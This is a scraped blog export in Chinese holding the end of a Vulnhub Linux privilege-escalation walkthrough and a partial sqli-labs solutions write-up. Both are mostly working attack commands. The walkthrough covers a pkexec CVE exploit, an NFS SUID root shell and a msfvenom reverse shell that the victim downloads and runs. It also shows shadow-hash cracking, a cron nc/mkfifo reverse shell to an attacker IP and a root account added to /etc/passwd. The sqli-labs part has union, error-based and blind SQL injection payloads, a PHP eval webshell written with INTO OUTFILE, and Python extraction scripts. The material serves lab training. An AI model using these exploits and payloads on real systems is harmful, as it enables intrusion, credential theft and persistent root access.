777 /tmp/ls/home/user5/script 0x03 CVE-2021-4034 (pkexec) 提权这个漏洞影响范围挺广的 1234# wget xxx/CVE-2021-4034-main.zip &gt; /tmp/CVE-2021-4034-main.zipunzip CVE-2021-4034-main.zip &amp;&amp; cd CVE-2021-4034-main &amp;&amp; make &amp;&amp; ./cve-2021-4034whoami# root 0x04 NFS提权12cat /etc/exports# /home/user5 *(rw,no_root_squash) 发现没有限制root权限用户的远程访问 先远程挂在到本地 1mount -o rw 192.168.192.144:/home/user5 /Users/tari/Test/tmp mac下但返回权限不足 12mount_nfs: can&#x27;t mount /home/user5 from 192.168.192.144 onto /Users/tari/Test/tmp: Operation not permittedmount: /Users/tari/Test/tmp failed with 1 然后 linux下通过 root 权限执行 1mount -t nfs 192.168.192.144:/ /mnt -o nolock 我们切换到目录下新建一个C文件 12cd /mnt/home/user5vim elevate.c 内容如下（即以root权限执行 /bin/bash） 12345#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;sys/types.h&gt; #include &lt;unistd.h&gt; int main() &#123; setuid(0); system(&quot;/bin/bash&quot;); return 0; &#125; 编译，并赋予 suid 权限 12gcc elevate.cchmod +s a.out 然后到需要提权的机器上执行这个文件即可 1/home/user5/a.out 0x05 MSF 提权先上线 msf 攻击机 1msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=xx.xx.xx.xx LPORT=2233 -f elf &gt; msf msfconsole 12345use exploit/multi/handlerset lhost xx.xx.xx.xxset lport xxxxset payload linux/x64/meterpreter/reverse_tcprun 受害者 1wget http://xxxx/msf &amp;&amp; chmod +x msf &amp;&amp; ./msf 攻击机 msfconsole 1234bguse post/multi/recon/local_exploit_suggesterset session &lt;session_id&gt;run mac 下不知为啥一个都没，kali 正常 123456[*] 192.168.192.144 - Collecting local exploits for x64/linux...[*] 192.168.192.144 - 41 exploit checks are being tried...[+] 192.168.192.144 - exploit/linux/local/network_manager_vpnc_username_priv_esc: The service is running, but could not be validated.[+] 192.168.192.144 - exploit/linux/local/ptrace_traceme_pkexec_helper: The target appears to be vulnerable.[+] 192.168.192.144 - exploit/linux/local/sudo_baron_samedit: The target appears to be vulnerable. sudo 1.8.21.2 is a vulnerable build.[*] Post module execution completed 利用，这里只成功利用了 exploit/linux/local/sudo_baron_samedit（target 5 是可以的，target 4 不行，其他没试） 1234use exploit/linux/local/sudo_baron_sameditset session &lt;session_id&gt;set target 5run 脏牛提权（失败）https://github.com/FireFart/dirtycow 1234curl http://xxxx/dirty.c &gt; /tmp/dirty.ccd /tmpgcc -pthread dirty.c -o dirty -lcryptchmod +x dirty &amp;&amp; ./dirty 试了两次，用户都没有创建成功 权限维持用户密码爆破1cat /etc/shadow 各个用户哈希 12345678910root:$6$mqjgcFoM$X/qNpZR6gXPAxdgDjFpaD1yPIqUF5l5ZDANRTKyvcHQwSqSxX5lA7n22kjEkQhSP6Uq7cPaYfzPSmgATM9cwD1:18050:0:99999:7:::user1:$6$9iyn/lCu$UxlOZYhhFSAwJ8DPjlrjrl2Wv.Pz9DahMTfwpwlUC5ybyBGpuHToNIIjTqMLGSh0R2Ch4Ij5gkmP0eEH2RJhZ0:18050:0:99999:7:::user2:$6$7gVE7KgT$ud1VN8OwYCbFveieo4CJQIoMcEgcfKqa24ivRs/MNAmmPeudsz/p3QeCMHj8ULlvSufZmp3TodaWlIFSZCKG5.:18050:0:99999:7:::user3:$6$PaKeECW4$5yMn9UU4YByCj0LP4QWaGt/S1aG0Zs73EOJXh.Rl0ebjpmsBmuGUwTgBamqCCx7qZ0sWJOuzIqn.GM69aaWJO0:18051:0:99999:7:::user4:$6$0pxj6KPl$NA5S/2yN3TTJbPypEnsqYe1PrgbfccHntMggLdU2eM5/23dnosIpmD8sRJwI1PyDFgQXH52kYk.bzc6sAVSWm.:18051:0:99999:7:::user5:$6$wndyaxl9$cOEaymjMiRiljzzaSaFVXD7LFx2OwOxeonEdCW.GszLm77k0d5GpQZzJpcwvufmRndcYatr5ZQESdqbIsOb9n/:18051:0:99999:7:::user6:$6$Y9wYnrUW$ihpBL4g3GswEay/AqgrKzv1n8uKhWiBNlhdKm6DdX7WtDZcUbh/5w/tQELa3LtiyTFwsLsWXubsSCfzRcao1u/:18051:0:99999:7:::mysql:$6$O2ymBAYF$NZDtY392guzYrveKnoISea6oQpv87OpEjEef5KkEUqvtOAjZ2i1UPbkrfmrHG/IonKdnYEec0S0ZBcQFZ.sno/:18053:0:99999:7:::user7:$6$5RBuOGFi$eJrQ4/xf2z/3pG43UkkoE35Jb0BIl7AW/umj1Xa7eykmalVKiRKJ4w3vFEOEOtYinnkIRa.89dXtGQXdH.Rdy0:18052:0:99999:7:::user8:$6$fdtulQ7i$G9THW4j6kUy4bXlf7C/0XQtntw123LRVRfIkJ6akDLPHIqB5PJLD4AEyz7wXsEhMc2XC4CqiTxATfb20xWaXP.:18052:0:99999:7::: 通过 john 去爆破 root 密码爆破出来了，其他爆不出来 权限提升 (2)到这里，能通过 webshell 直接去提权的方式已经用的差不多了，有其他方式欢迎大佬们补充～ 0x06 mysql 信息泄漏通过 PEASS-ng 发现 mysql 密码为 root，连进去发现 user库user_info表存着mysql的密码 通过 /etc/passwd 得知mysql用户是可登陆的，猜测这个密码是mysql用户的登录密码 查找一下该用户的所属文件 1find / -user mysql 发现 /var/mysql 目录下有点有意思的文件，特别是这个 1---------- 1 mysql mysql 126 Jun 6 2019 .user_informations 给一下权限 12345678910chmod +r .user_informationscat .user_informations# 输出# user2:user2@12345# user3:user3@12345# user4:user4@12345#.user5:user5@12345# user6:user6@12345# user7:user7@12345# user8:user8@12345 发现了类似其他用户的密码，尝试切换可成 另外一个敏感文件 /etc/mysql/secret.cnf 发现 root 密码，不过 root 密码不是 12345 嘛.. 12345chmod +r /etc/mysql/secret.cnfcat /etc/mysql/secret.cnf# 输出# UserName:root# PassWord:root@12345 0x07 crontab 提权登陆至 user4 12cat /etc/crontab# */5 * * * * root /home/user4/Desktop/autoscript.sh 查看定时任务发现每隔5分钟以root权限执行 /home/user4/Desktop/autoscript.sh 脚本 更改 autoscript.sh 为（这里直接 bash -i 反弹会提示 fd 不存在， nc -e 提示没有 -e 参数） 1echo &#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc xx.xx.xx.xx 2234 &gt;/tmp/f&#x27; &gt; /home/user4/Desktop/autoscript.sh 过5分钟即会反弹一个root的shell回来 0x08 sudoers 提权 1user8，运行 1sudo -l 发现可以免密通过 vi 命令执行root权限操作 随便 vi 一个文件 123sudo vi test# 进入 vi 后输入:!sh 0x09 root组用户提权至root登陆至 user7 查看 /etc/passwd 文件权限发现同组可写 12ls -l /etc/passwd# -rw-rw-r-- 1 root root 2648 Jun 5 2019 /etc/passwd 先备份一下 cp /etc/passwd . 然后写入一个 root 用户 id 等信息至 /etc/passwd 然后切换即可 123cp /etc/passwd .echo &quot;tari:$(openssl passwd -1 -salt tari 12345):0:0:root:/root:/bin/bash&quot; &gt;&gt; /etc/passwdsu tari user4 也是属于 root 组的，也可以这样做 sudoer 提权 2登陆user2 123sudo -l# 输出# (user1) ALL 发现可接管 user1 用户，这个用户在没在 mysql 泄漏的密码中 1sudo -u user1 /bin/bash 切换后继续看特权命令 sudo -l 可直接提权至 root 总结至此，所有用户的提权方式已经覆盖的完了，靶机简介说是有 12+ 种提权方式，不过我这里不重复的提权方式是9种。 发现靶机刚好是用 apache，顺便补充一种 sudo 滥用下的 apache 任意文件查看[4] 1sudo apache2 -f /etc/shadow 这个靶机没安装这个模块，所以返回 AH00534: apache2: Configuration error: No MPM loaded. 整体来看，Linux 提权相关的还是挺全了，还不错的靶机。 参考[1] https://ethicalhackingguru.com/escalate_linux-walkthrough/ [2] https://my.oschina.net/u/4196756/blog/4645765 [3] https://blog.katastros.com/a?ID=01600-b3c56dca-ab08-47e3-86f9-98b83a76d366 [4] https://www.freebuf.com/articles/system/251884.html","categories":[{"name":"后渗透","slug":"后渗透","permalink":"https://tari.moe/categories/%E5%90%8E%E6%B8%97%E9%80%8F/"},{"name":"权限提升","slug":"后渗透/权限提升","permalink":"https://tari.moe/categories/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"},{"name":"vulnhub","slug":"后渗透/权限提升/vulnhub","permalink":"https://tari.moe/categories/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/vulnhub/"}],"tags":[{"name":"后渗透","slug":"后渗透","permalink":"https://tari.moe/tags/%E5%90%8E%E6%B8%97%E9%80%8F/"},{"name":"权限提升","slug":"权限提升","permalink":"https://tari.moe/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"},{"name":"vulnhub","slug":"vulnhub","permalink":"https://tari.moe/tags/vulnhub/"}]},{"title":"sqli-labs 靶场 1-65 通关记","slug":"2022/sqli-labs","date":"2022-03-23T00:43:23.000Z","updated":"2022-12-25T01:40:12.347Z","comments":true,"path":"/p/2022/sqli-labs/","link":"","permalink":"https://tari.moe/p/2022/sqli-labs/","excerpt":"","text":"前言好耶✌️！从2021年立下flag的sqli-labs靶场终于给刷完了，不得不说经典永远是经典，边刷边闻到了许多CTF题的味道。去年初的时候就把前20关给刷了，后面跑去刷ctfshow和干其他事情，然后就忘了，直到去年底看到团队师傅SQL注入玩的那么溜，各种bypass waf，于是就想把基础在巩固一波～ 在这里顺便安利一波 lcamry 大佬的 mysql注入天书，刷的时候发现网上许多文章也是参考他的来的，然后里面也讲的更细，也有拓展，比网上许多文章写的都好，更像是 sqli-labs 的配套 WriteUp （ 环境搭建在网站解析目录执行： 1git clone https://github.com/Audi-1/sqli-labs.git sqli-labs 修改 sql-connections/db-creds.inc 里数据库的连接用户和密码 访问index.html ，点Setup/reset Database for labs 安装即可，如果有报错就根据报错解决，之后就可以愉快的玩耍啦~ mac使用mamp pro的连接数据库的一个小坑，这个要勾上 不然本机用客户端连不上，不知道为啥php里直接连竟然可以，而且是不用指定端口的 less-1 GET 注入验证注入点：单引号报错，两个单引号闭合利用闭合方式：&#39; &lt;payload&gt; --+ 获取本表中的字段，到4刚刚好报错1id=2&#x27; order by 4 --+ 关于 -- 和 --+ 疑问：-- 在sql语句中起到注释的作用，按理说--和--+ 作用是一样才对看法：PHP 在接收接收参数时，会对参数进行一次urldecode 如我们在浏览器地址栏输入网址时，会调用类似strip的函数去除首尾的空格，例如下图是可以正常访问的 所以，如果后面如果原本接着字符，以这个举例子是 --&#39; 那么这就是三个字符，后面没有字符 就不是 -- &#39; 这样，MySQL是不会把它解析为注释符号的。 但 URL 里 不能 -- 因为会被浏览器之类的替换为空，所以把空格编码一下就是 + 啦！ 当然这是 get 请求的情况，如果是 post 请求（且Content-Type不为x-www-form-urlencoded或与这个Content-Type类似效果），加 + 就有问题了， + 还是 +，而不是空格的URL编码，此时应把+替换为%20，urldecode后就是空格啦。经测试，一般出现在 HTTP头里的 + 会被 urldecode 为空格 然后 -- 和 --+ 在MySQL中是不一样的， -- 才是注释，--+ 不是注释，观察4种情况 第1种正常，注释后面为空 第2种异常，--+ 并非注释，MySQL无法解析，从而抛出异常 第3种异常，-- 注释后面如果还有字符，需要加空格 第4种正常 所以一般 -- 后面都有个 + 或者空格，防止后面拼接了字符 当然常用的注释还有 #这种注释就不用担心 -- 后面有没有紧接着字符啦。 获取本表回显至前端的第x个字段为接下来的union注入做准备： union注入时，我们虽然可以通过注入获得想要的信息，但这些信息必须能够回显。例如本例有3个字段，这些字段不是都显示在网页前端的，只有第2和3个字段的查询结果会回显。 因此我们需要知道这3个字段中哪两个结果会回显，这个过程相当于找到数据库与回显的通道。这时候我们利用一个简单的select 1,2,3，根据显示在页面上的数字就可以知道哪个数字是这个“通道”，那么我们只需要把这个数字改成我们想查询的内容（如version(),database()），当数据爆破成功后，就会在窗口显示我们想要的结果。 当然这里的 1,2,3 是可以换的，只要自己能辨认出来即可 1id=1&#x27; and 1=2 union select 1,2,3 --+ 可知会回显的为第2和第3个字段 关于 and 1=2 使用 and 1=2 是为了让本应正常输出的字段出错，然后达到我们的目的。 例如本例中只能输出一行，但我们需要通过正常查询来闭合，但我们想知道输出的是哪些字段，会被正常输出的所屏蔽。如正常查询： 为达到目的我们需要： 数据库中的返回结果： 获取一下数据库和版本1id=1&#x27; and 1=2 union select 1,version(),database() --+ 获取所有数据库名1select * from information_schema.schemata 1234id=1&#x27; and 1=2 union select 1, (select group_concat(schema_name) from information_schema.schemata), 3 --+ 获取security库所有表名1select * from information_schema.tables where table_schema=&#x27;security&#x27; 1234id=1&#x27; and 1=2 union select 1, (select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;), 3 --+ 爆破security库users表列名1234id=1&#x27; and 1=2 union select 1, (select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;), 3 --+ 爆破security库users表数据123id=1&#x27; and 1=2 union select 1, (select group_concat(username) from security.users), (select group_concat(password) from security.users) --+ less-2 GET 注入验证注入点：单引号报错，不用闭合可执行 SQL语句利用闭合方式：&lt;payload&gt; 与第一关基本一样，就 id 不用闭合 直接插入SQL语句即可 猜字段1id=1 order by 4 --+ 回显字段位置1id=1 and 1=2 union select 1,2,3 --+ 数据库和版本1id=1 and 1=2 union select 1,version(),database() --+ 获取所有数据库名123id=1 and 1=2 union select 1,(select group_concat(schema_name) from information_schema.schemata),3 --+ 获取security库所有表名123id=1 and 1=2 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),3 --+ 爆破security库users表列名123id=1 and 1=2 union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),3 --+ 爆破security库users表数据123id=1 and 1=2 union select 1,(select group_concat(username) from security.users),(select group_concat(password) from security.users) --+ less-3 GET 注入验证注入点：单引号报错，两个单引号闭合利用闭合方式：&#39;) &lt;payload&gt; --+ 也是闭合符号不一样 猜字段11&#x27;) order by 4 --+ 爆破数据123id=1&#x27;) and 1=2 union select 1,(select group_concat(username) from security.users),(select group_concat(password) from security.users) --+ less-4 GET 注入验证注入点：双引号报错，两个双引号闭合利用闭合方式：&quot;) &lt;payload&gt; --+ 也是闭合符号不一样 猜字段1id=1&quot;) order by 4 --+ 爆破数据123id=1&quot;) and 1=2 union select 1,(select group_concat(username) from security.users),(select group_concat(password) from security.users) --+ Less-5 GET 报错注入验证注入点：单引号报错，两个单引号闭合利用闭合方式：&#39; &lt;payload&gt; --+考察点：报错注入 通过floor报错 最多回显 64 个字符推荐阅读：https://blog.csdn.net/weixin_45146120/article/details/100062786 ，报错原理讲的很好！ 12345union select count(*),0,concat(0x3a, (&lt;payload&gt;),0x3a,floor(rand(0)*2)) as a from information_schema.tables group by a --+ 获取数据库123id=1&#x27; union select count(*),0,concat(0x3a,(select database()),0x3a,floor(rand(0)*2)) as a from information_schema.tables group by a --+ 执行多条语句12345id=1&#x27; union select count(*),0,concat(0x3a, (select concat(version,0x3a,database(),0x3a,user(),0x3a)),0x3a,floor(rand(0)*2)) as a from information_schema.tables group by a --+ 获取表名1234id=1&#x27; union select count(*),0,concat(0x3a, (select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x3a,floor(rand(0)*2)) 获取列名12345id=1&#x27; union select count(*),0,concat(0x3a, (select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),0x3a,floor(rand(0)*2)) as a from information_schema.tables group by a --+ 从这里可以看出，使用floor报错最多能输出 64 个字符 获取数据12345id=1&#x27; union select count(*),0,concat(0x3a, (select username from users limit 1),0x3a,floor(rand(0)*2)) as a from information_schema.tables group by a --+ 不是很能理解，为什么这里用 group_concat 不行 12345id=1&#x27; union select count(*),0,concat(0x3a, (select group_concat(username,password) from users),0x3a,floor(rand(0)*2)) as a from information_schema.tables group by a --+ 通过 updatexml 报错 最多回显 32 个字符报错说明：https://www.cnblogs.com/vspiders/p/7400415.html 1and updatexml(1,concat(0x7e,(&lt;payload&gt;),0x7e),1) --+ 获取数据库1id=1&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+ 获取数据1id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(id,username,password) from users),0x7e),1) --+ 由此可以看出，使用floor报错最多能输出 32 个字符 通过 ExtractValue 报错 最多回显 32 个字符报错说明：https://www.cnblogs.com/laoxiajiadeyun/p/10488731.html 1and ExtractValue(1, concat(0x7e,(&lt;payload&gt;),0x7e)) --+ 获取数据库1id=1&#x27; and ExtractValue(1, concat(0x7e,(select database()),0x7e)) --+ 获取数据1id=1&#x27; ExtractValue(1, concat(0x7e,(select group_concat(id,username, password) from users),0x7e)) --+ 由此可以看出，使用 ExtractValue 报错最多能输出 32 个字符 Less-6 GET 报错注入或布尔盲注验证注入点：双引号报错，两个双引号闭合利用闭合方式：&quot; &lt;payload&gt; --+ 就闭合方式和 Less-5 不一样外，其余都一样 获取数据 12345id=1&quot; union select count(*),0,concat(0x3a, (select username from users limit 1),0x3a,floor(rand(0)*2)) as a from information_schema.tables group by a --+ Less-7 GET 注入写 shell验证注入点：单引号报错，两个单引号闭合利用闭合方式：&#39;)) &lt;payload&gt; --+ 根据靶场首页的题目名字，是想让我们试试写shell 写 Shell 即 MySQL 需要对外写文件，但默认 MySQL 是不允许使用 outfile 来导出数据的，先手动在 MySQL 确认一下。 1show global variables like &#x27;%secure%&#x27;; 参考这里：https://www.cnblogs.com/lyxsalyd/p/11955988.html MYSQL的特性 secure_file_priv 对读写文件的影响，此开关默认为NULL，即不允许导入导出。 12345678910secure-file-priv参数是用来限制LOAD DATA，SELECT ...OUTFILE,and LOAD_FILE()传到哪个指定目录的 当secure_file_priv的值为null，表示限制mysqld不允许导入|导出 当secure_file_prv的值为/tmp/,表示限制mysqld 的导入|导出只能发生在/tmp/目录下 当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制windows下：修改my.ini 在[mysqld]内加入secure_file_priv =linux下：修改my.cnf 在[mysqld]内加入secure_file_priv =然后重启mysql 写 Shell 1id=1&#x27;)) union select null,0x3c3f706870206576616c28245f504f53545b27707764275d293b3f3e,null into outfile &#x27;/Applications/MAMP/htdocs/sqli-labs/Less-7/tari.php&#x27; --+ 这里有个小注意事项，不能直接把 &lt;?php eval($_POST[&#39;pwd&#39;]);?&gt; 转 16 进制，因为 &lt;?php eval 之间的空格不会保留的。因此要手动加上 20 空格，不然写的 shell 会是 &lt;?phpeval 这样的。 报错不要紧因为这个语句值返回空 看一波这个目录就知道成功写进去了 Less-8 GET 布尔盲注验证注入点：单引号无回显，两个单引号闭合利用闭合方式：&#39; &lt;payload&gt; --+ 数据库长度 1id=1&#x27; and length(database()) = 8 --+ 数据库名 security 123456789101112131415id=1&#x27; and ascii(substr((select database()),1,1)) = 115 --+id=1&#x27; and ascii(substr((select database()),2,1)) = 101 --+id=1&#x27; and ascii(substr((select database()),3,1)) = 99 --+id=1&#x27; and ascii(substr((select database()),4,1)) = 117 --+id=1&#x27; and ascii(substr((select database()),5,1)) = 114 --+id=1&#x27; and ascii(substr((select database()),6,1)) = 105 --+id=1&#x27; and ascii(substr((select database()),7,1)) = 116 --+id=1&#x27; and ascii(substr((select database()),8,1)) = 121 --+ 注意这里的 substr((select database()),1,1) 第一个参数必须带括号，因为 select 语句返回元组的形式，如果没有括号，则其结果的参数均会作为 substr 的参数代入，从而会报错。 获取第一个表的长度，并获取表名 emails 12345678910111213id=1&#x27; and (length((select table_name from information_schema.tables where table_schema=database() limit 0,1))) = 6 --+id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)) = 101 --+id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1)) = 109 --+id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),3,1)) = 97 --+id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),4,1)) = 105 --+id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),5,1)) = 108 --+id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),6,1)) = 115 --+ 获取表数据字段 分别是 2，8 123id=1&#x27; and (select length(column_name) from information_schema.columns where table_name=&#x27;emails&#x27; limit 0,1) = 2 --+id=1&#x27; and (select length(column_name) from information_schema.columns where table_name=&#x27;emails&#x27; limit 1,1) = 8 --+ 获取字段名 123456789101112131415161718192021# idid=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;emails&#x27; limit 0,1),1,1)) = 105 --+id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;emails&#x27; limit 0,1),2,1)) = 100 --+# email_idid=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;emails&#x27; limit 1,1),1,1)) = 101 --+id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;emails&#x27; limit 1,1),2,1)) = 109 --+id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;emails&#x27; limit 1,1),3,1)) = 97 --+id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;emails&#x27; limit 1,1),4,1)) = 105 --+id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;emails&#x27; limit 1,1),5,1)) = 108 --+id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;emails&#x27; limit 1,1),6,1)) = 95 --+id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;emails&#x27; limit 1,1),7,1)) = 105 --+id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;emails&#x27; limit 1,1),8,1)) = 100 --+ 获取数据查询表的字段个数 1id=1&#x27; and (select count(*) from emails) = 8 --+ 获取第一个字段数据长度 1id=1&#x27; and (select length(email_id) from emails limit 0,1) = 16 --+ 获取第一个字段数据 12# 第一个字段第一个字母是 Did=1&#x27; and ascii(substr((select email_id from emails limit 0,1),1,1)) = 68 --+ 写个脚本获取这个字段所以 16 个字符 12345678910111213141516171819import requestsdef get_data(): result = &quot;&quot; url_template = &quot;http://localhost:8890/sqli-labs/Less-8/?id=1&#x27; and ascii(substr((select email_id from emails limit 0,1),&#123;0&#125;,1))&gt;&#123;1&#125; %23&quot; chars = &#x27;.0123456789@ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz&#x27; for i in range(1,17): for char in chars: char_ascii = ord(char) url = url_template.format(i,char_ascii) response = requests.get(url) length = len(response.text) #返回的长度等于 831 就中了 if length &gt; 830: result += char print(result) breakget_data() Less-9 GET 时间盲注验证注入点：&#39; and sleep(5) --+利用闭合方式：&#39; &lt;payload&gt; --+ 无法查看页面返回情景，所以查询语句正确时，需要通过流程控制来判断进行时间延迟输出判断。 MySQL的 ifif(表达式,真,假) 利用 and 语句的特性，当有一个为假时，后面不用判断 1id=1&#x27; and &lt;payload&gt; and if(1=1, sleep(5), null) --+ 例如猜数据库长度 1id=1&#x27; and (length(database())) = 8 and if(1=1, sleep(5), null) --+ 数据库名第一个字母 s 1id=1&#x27; and ascii(substr((select database()),1,1)) = 115 and if(1=1, sleep(5), null) --+ 查询表字段数 1id=1&#x27; and (select count(*) from emails) = 7 and if(1=1, sleep(5), null) --+ 和 Less-8 获取的数据一样 123456789101112131415161718192021import timeimport requestsdef get_data(): result = &quot;&quot; url_template = &quot;http://localhost:8890/sqli-labs/Less-9/?id=1&#x27; and ascii(substr((select email_id from emails limit 0,1),&#123;0&#125;,1))=&#123;1&#125; and if(1=1, sleep(5), null) --+&quot; chars = &#x27;.0123456789@ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz&#x27; for i in range(1,17): for char in chars: char_ascii = ord(char) url = url_template.format(i,char_ascii) time_start = time.time() _ = requests.get(url) time_diff = time.time() - time_start # 返回时间 &gt; 5s if time_diff &gt; 5: result += char print(result) breakget_data() Less-10 GET 时间盲注验证注入点：&quot; and sleep(5) --+利用闭合方式：&quot; &lt;payload&gt; --+ 获取 Less-8 的数据脚本需要改动的地方： 1url_template = &quot;http://localhost:8890/sqli-labs/Less-10/?id=1\\&quot; and ascii(substr((select email_id from emails limit 0,1),&#123;0&#125;,1))=&#123;1&#125; and if(1=1, sleep(5), null) --+&quot; 这里在介绍另外一种时间盲注方法 12345select if( (select(substr((select username from users WHERE username=&quot;Dumb&quot; LIMIT 1), 2, 1))=&quot;u&quot;), sleep(2), 0) if带括号是函数，不能直接用，所以最开始要拉上个 select 如果 if 第一个参数不是表达式，要用括号扩起来 参考自 https://www.w3resource.com/mysql/control-flow-functions/if-function.php Less-11 POST 注入验证注入点：单引号报错，两个单引号闭合利用闭合方式：admin&#39; &lt;payload&gt; #&amp;passwd=1 如果用 admin&#39; -- 注意 -- 后面有个空格，或者 --+ 也可以，保证HTTP请求包的 Content-Type 是 x-www-form-urlencoded 或Content-Type起到效果类似即可，因为这样包发出时会对POST请求体部分进行url编码。 获取列数1uname=admin&#x27; order by 2#&amp;passwd=1 爆破数据1234567891011# 库uname=admin&#x27; and 1=2 union select 1,(select group_concat(schema_name) from information_schema.schemata)#&amp;passwd=1# 表uname=admin&#x27; and 1=2 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)#&amp;passwd=1# 字段uname=admin&#x27; and 1=2 union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;)#&amp;passwd=1# 数据uname=admin&#x27; and 1=2 union select (select group_concat(username) from security.users),(select group_concat(password) from security.users) #&amp;passwd=1 Less-12 POST验证注入点：双引号报错，两个双引号闭合利用闭合方式：admin&quot;) &lt;payload&gt; #&amp;passwd=1 获取列数 1uname=admin&quot;) order by 2#&amp;passwd=1 爆破数据 1234567891011# 库uname=admin&quot;) and 1=2 union select 1,(select group_concat(schema_name) from information_schema.schemata)#&amp;passwd=1# 表uname=admin&quot;) and 1=2 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)#&amp;passwd=1# 字段uname=admin&quot;) and 1=2 union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;)#&amp;passwd=1# 数据uname=admin&quot;) and 1=2 union select (select group_concat(username) from security.users),(select group_concat(password) from security.users) #&amp;passwd=1 Less-13 POST 报错注入验证注入点：单引号报错，两个单引号闭合利用闭合方式：uname=admin&#39;) &lt;payload&gt; #&amp;passwd=1 获取数据库 1uname=admin&#x27;) and updatexml(1,concat(0x7e,(select database()),0x7e),1) #&amp;passwd=1 获取数据 12345678910# 表uname=admin&#x27;) and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x7e),1) #&amp;passwd=1# 字段uname=admin&#x27;) and updatexml(1,concat(0x7e,(select concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; limit 3,1),0x7e),1) #&amp;passwd=1uname=admin&#x27;) and updatexml(1,concat(0x7e,(select concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; limit 4,1),0x7e),1) #&amp;passwd=1uname=admin&#x27;) and updatexml(1,concat(0x7e,(select concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; limit 5,1),0x7e),1) #&amp;passwd=1# 数据uname=admin&#x27;) and updatexml(1,concat(0x7e,(select concat(id,username,password) from users limit 0,1),0x7e),1) #&amp;passwd=1 Less-14 POST 报错注入验证注入点：双引号报错，两个双引号闭合利用闭合方式：uname=admin&quot; &lt;payload&gt; #&amp;passwd=1 获取数据 1uname=admin&quot; and updatexml(1,concat(0x7e,(select concat(id,username,password) from users limit 0,1),0x7e),1) #&amp;passwd=1 Less-15 POST 布尔盲注验证注入点：万能密码登录成功 → uname=0x74617269’ or 1=1 #&amp;passwd=1利用闭合方式：uname=admin&#39; &lt;payload&gt; #&amp;passwd=1要确保 0x74617269 是不存在的，因为用的是 or, 如果 uname 是存在的就用 and 获取数据库长度 1uname=0x74617269&#x27; or length(database()) = 8 #&amp;passwd=1 获取数据查询表的字段个数 1uname=0x74617269&#x27; or (select count(*) from emails) = 8 #&amp;passwd=1 获取第一个字段数据长度 1uname=0x74617269&#x27; or (select length(email_id) from emails limit 0,1) = 16 #&amp;passwd=1 获取第一个字段数据 12# 第一个字段第一个字母是 Duname=0x74617269&#x27; or ascii(substr((select email_id from emails limit 0,1),1,1)) = 68 #&amp;passwd=1 写个脚本获取这个字段所有 16 个字符 1234567891011121314151617181920212223242526272829import requestsdef get_data(): result = &quot;&quot; url = &quot;http://localhost:8890/sqli-labs/Less-15/&quot; data_template = &#123; &#x27;uname&#x27;: &#x27;0x74617269\\&#x27; or ascii(substr((select email_id from emails limit 0,1),&#123;0&#125;,1)) = &#123;1&#125; #&#x27;, &#x27;passwd&#x27;: &#x27;1&#x27; &#125; data = &#123; &#x27;uname&#x27;: &#x27;&#x27;, &#x27;passwd&#x27;: &#x27;1&#x27; &#125; chars = &#x27;.0123456789@ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz&#x27; for i in range(1,17): for char in chars: char_ascii = ord(char) data[&#x27;uname&#x27;] = data_template[&#x27;uname&#x27;].format(i,char_ascii) response = requests.post(url, data) length = len(response.text) #返回的长度等于 1447 就中了 if length &gt; 1447: result += char print(result) breakget_data() Less-16 POST 布尔盲注验证注入点：万能密码登录成功 → uname=admin”) or 1=1#&amp;passwd=1利用闭合方式：uname=0x74617269&quot;) &lt;payload&gt; #&amp;passwd=1获取数据库长度 POST 1uname=0x74617269&quot;) or length(database()) = 8 #&amp;passwd=1 获取第一个字段数据 16 个字符 1234567891011121314151617181920212223242526272829import requestsdef get_data(): result = 